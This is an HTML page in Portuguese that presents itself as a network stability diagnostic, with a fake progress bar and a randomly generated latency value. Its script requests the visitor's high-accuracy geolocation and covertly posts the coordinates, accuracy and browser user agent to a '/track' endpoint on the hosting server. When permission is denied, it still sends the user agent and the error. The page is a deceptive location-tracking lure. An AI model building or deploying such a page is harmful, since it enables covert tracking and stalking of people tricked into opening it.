<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diagnóstico de Rede</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 100%; max-width: 500px; padding: 30px; text-align: center; }
        .logo { width: 60px; height: 60px; background: #2563eb; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; color: white; font-size: 24px; }
        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #1f2937; }
        p.desc { color: #6b7280; font-size: 0.95rem; margin-bottom: 25px; }
        .progress-container { background: #e5e7eb; border-radius: 10px; height: 12px; width: 100%; margin-bottom: 20px; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: #2563eb; transition: width 0.5s ease-in-out; }
        .status-text { font-weight: 600; color: #2563eb; margin-bottom: 5px; }
        .result-box { display: none; background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 8px; padding: 15px; margin-top: 20px; text-align: left; font-size: 0.9rem; }
        .result-item { display: flex; justify-content: space-between; margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">📡</div>
        <h1>Teste de Estabilidade de Rede</h1>
        <p class="desc">Verificando conexão local e região de serviço.</p>
        <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
        <div class="status-text" id="status">Iniciando diagnóstico...</div>
        <div style="font-size: 0.8em; color: #9ca3af;" id="substatus">Coletando dados de sensores...</div>
        <div class="result-box" id="results">
            <div class="result-item"><span>Estado da Conexão:</span><span style="color:#10b981; font-weight:bold;">✅ Estável</span></div>
            <div class="result-item"><span>Latência Estimada:</span><span id="latency">-- ms</span></div>
            <div class="result-item"><span>Precisão do Sensor:</span><span id="accuracy">-- m</span></div>
        </div>
    </div>

    <script>
        const progress = document.getElementById('progress');
        const status = document.getElementById('status');
        const substatus = document.getElementById('substatus');
        const results = document.getElementById('results');

        function simulateProgress(percent, text) {
            progress.style.width = percent + '%';
            if (text) status.innerText = text;
        }

        simulateProgress(30, "Verificando handshake TCP/IP...");
        setTimeout(() => simulateProgress(60, "Consultando roteamento..."), 1000);

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    simulateProgress(100, "Diagnóstico Concluído");
                    setTimeout(() => {
                        document.getElementById('latency').innerText = Math.floor(Math.random() * 40 + 20) + " ms";
                        document.getElementById('accuracy').innerText = Math.round(accuracy) + " m";
                        results.style.display = 'block';
                        substatus.innerText = "Verificação concluída.";
                    }, 500);

                    fetch(window.location.origin + '/track', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: lat,
                            lon: lon,
                            accuracy: accuracy,
                            userAgent: navigator.userAgent
                        })
                    }).catch(err => console.error("Erro:", err));
                },
                (error) => {
                    simulateProgress(100, "Diagnóstico Parcial");
                    setTimeout(() => {
                        results.style.display = 'block';
                        substatus.innerText = "Sensores indisponíveis.";
                    }, 500);
                    fetch(window.location.origin + '/track', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: null, lon: null, accuracy: null,
                            userAgent: navigator.userAgent,
                            error: error.message
                        })
                    });
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
